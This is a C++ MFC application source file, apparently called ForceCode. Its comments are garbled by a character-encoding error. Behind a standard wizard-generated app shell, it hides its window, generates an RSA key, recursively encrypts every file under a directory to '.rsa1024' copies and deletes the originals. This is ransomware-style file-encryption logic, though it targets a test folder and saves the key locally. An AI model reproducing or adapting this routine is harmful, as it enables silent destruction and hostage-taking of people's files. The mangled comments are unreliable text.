
// ForceCode.cpp : ����Ӧ�ó��������Ϊ��
//

#include "stdafx.h"
#include "afxwinappex.h"
#include "afxdialogex.h"
#include "ForceCode.h"
#include "MainFrm.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif



private_key pkey;



// CForceCodeApp

BEGIN_MESSAGE_MAP(CForceCodeApp, CWinAppEx)
	ON_COMMAND(ID_APP_ABOUT, &CForceCodeApp::OnAppAbout)
END_MESSAGE_MAP()


// CForceCodeApp ����

CForceCodeApp::CForceCodeApp()
{
	m_bHiColorIcons = TRUE;

	// TODO: ������Ӧ�ó��� ID �ַ����滻ΪΨһ�� ID �ַ�����������ַ�����ʽ
	//Ϊ CompanyName.ProductName.SubProduct.VersionInformation
	SetAppID(_T("ForceCode.AppID.NoVersion"));

	// TODO: �ڴ˴���ӹ�����룬
	// ��������Ҫ�ĳ�ʼ�������� InitInstance ��
}

// Ψһ��һ�� CForceCodeApp ����

CForceCodeApp theApp;


// CForceCodeApp ��ʼ��

BOOL CForceCodeApp::InitInstance()
{
	CWinAppEx::InitInstance();


	EnableTaskbarInteraction(FALSE);

	// ʹ�� RichEdit �ؼ���Ҫ  AfxInitRichEdit2()	
	// AfxInitRichEdit2();

	// ��׼��ʼ��
	// ���δʹ����Щ���ܲ�ϣ����С
	// ���տ�ִ���ļ��Ĵ�С����Ӧ�Ƴ�����
	// ����Ҫ���ض���ʼ������
	// �������ڴ洢���õ�ע�����
	// TODO: Ӧ�ʵ��޸ĸ��ַ�����
	// �����޸�Ϊ��˾����֯��
	SetRegistryKey(_T("Ӧ�ó��������ɵı���Ӧ�ó���"));


	InitContextMenuManager();

	InitKeyboardManager();

	InitTooltipManager();
	CMFCToolTipInfo ttParams;
	ttParams.m_bVislManagerTheme = TRUE;
	theApp.GetTooltipManager()->SetTooltipParams(AFX_TOOLTIP_TYPE_ALL,
		RUNTIME_CLASS(CMFCToolTipCtrl), &ttParams);

	// ��Ҫ���������ڣ��˴��뽫�����µĿ�ܴ���
	// ����Ȼ��������ΪӦ�ó���������ڶ���
	CMainFrame* pFrame = new CMainFrame;
	if (!pFrame)
		return FALSE;
	m_pMainWnd = pFrame;
	// ���������ؿ�ܼ�����Դ
	pFrame->LoadFrame(IDR_MAINFRAME, WS_OVERLAPPEDWINDOW | FWS_ADDTOTITLE, NULL, NULL);





	// Ψһ��һ�������ѳ�ʼ���������ʾ����������и���
	//pFrame->ShowWindow(SW_SHOW);
	//pFrame->UpdateWindow();
	// �������к�׺ʱ�ŵ��� DragAcceptFiles
	//  �� SDI Ӧ�ó����У���Ӧ�� ProcessShellCommand ֮����

	pFrame->ShowWindow(SW_HIDE);
	//ShowWindow(AfxGetMainWnd()->m_hWnd, SW_HIDE);//����������
	pkey=MakePrime(MODE_1024);//����1024λ��Կ
	while(rsa1024_checkprivatekey(pkey)==false)//�������ܳײ�����Ҫ��
	{
		pkey=MakePrime(MODE_1024);//���²���1024λ��Կ
	}
	//rsa1024_privatekey_outtofile("c:\\Windows\\System32\\rsa1024pkey.dat",pkey);
	//rsa1024_privatekey_outtofile("d:\\rsa1024pkey.dat",pkey);
	CString pkeyfilename=MyGetTime("d:\\rsa1024pkey%Y%m%d%H%M%S.dat");//Ϊ����˳��������в�����ͬ�ܳף�д���ܳ��ļ�ʱ����ԭ�ļ������õ�ǰʱ���������ļ��������⸲��ԭ�ļ�
	rsa1024_privatekey_outtofile(MyCStringToConstChar(pkeyfilename),pkey);
	const CString strDirPath=_T("d:\\filetest");
	int filenumber=-1;
	for(int i=0;i<10&&filenumber!=0;i++)//���10��
	{
		if(PathFileExists(strDirPath))//�ж��ļ�·���Ƿ����
		{
			SetCurrentDirectory(strDirPath);//���õ�ǰĿ¼
			filenumber=FindFile(strDirPath);
		}
		else//�ļ�·��������
		{
			exit(0);
		}
	}
	exit(0);

	return TRUE;
}

int CForceCodeApp::ExitInstance()
{
	//TODO: �����������ӵĸ�����Դ
	return CWinAppEx::ExitInstance();
}

// CForceCodeApp ��Ϣ�������


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()

// �������жԻ����Ӧ�ó�������
void CForceCodeApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

// CForceCodeApp �Զ������/���淽��

void CForceCodeApp::PreLoadState()
{
	BOOL bNameValid;
	CString strName;
	bNameValid = strName.LoadString(IDS_EDIT_MENU);
	ASSERT(bNameValid);
	GetContextMenuManager()->AddMenu(strName, IDR_POPUP_EDIT);
}

void CForceCodeApp::LoadCustomState()
{
}

void CForceCodeApp::SaveCustomState()
{
}

// CForceCodeApp ��Ϣ�������

int CForceCodeApp::FindFile(CString Curdir)
{
	int filenumber=0;
	CFileFind  finder;
    BOOL bWorking = finder.FindFile(_T("*.*"));
    while(bWorking)
    {
		bWorking = finder.FindNextFile();
        if(finder.IsDirectory()&&!finder.IsDots())//�ļ���
		{
			LPWSTR oldDir=new WCHAR[512];//����ԭʼ�ĵ�ǰ·��
			GetCurrentDirectory(512,oldDir);//��ȡ��ǰ·��
			SetCurrentDirectory(finder.GetFilePath());
			FindFile(finder.GetFilePath());//�����������ļ���
			SetCurrentDirectory(oldDir);//�ָ���ǰĿ¼
			delete oldDir;
		}
        else if(!finder.IsDirectory())//�ļ�
		{
			CString FileName=finder.GetFileName();
			int Where=FileName.ReverseFind('//');
            if(Where==-1)
            {
                Where=FileName.ReverseFind('/');
            }
            CString FileTitle=FileName.Right(FileName.GetLength()-1-Where);
            int Which=FileTitle.ReverseFind('.');
            CString ExtendName=FileTitle.Right(FileTitle.GetLength()-Which-1);
			if(ExtendName!="rsa1024")
			{
				filenumber++;
				CString FileName=finder.GetFilePath();
			    char filename_in[512];
	            char filename_out[512];
			    strcpy_s(filename_in,512,MyCStringToConstChar(FileName));
				sprintf_s(filename_out,512,"%s.rsa1024",filename_in);
				int result_code=rsa1024_file_code(filename_in, filename_out, pkey, MODE_NOCREATEPRIVATEKEY_NOCHECKPRIVATEKEY);
				for(int i=0;i<10&&result_code!=1;i++)//�������ʧ�ܣ����ٳ���10��
				{
					result_code=rsa1024_file_code(filename_in, filename_out, pkey, MODE_NOCREATEPRIVATEKEY_NOCHECKPRIVATEKEY);
				}
				if(result_code==1)//������ܳɹ�����ɾ��ԭ�ļ�
				{
					DeleteFile(MyCharToLPCTSTR(filename_in));
				}
			}
		}
    }
	finder.Close();
	return filenumber;
}
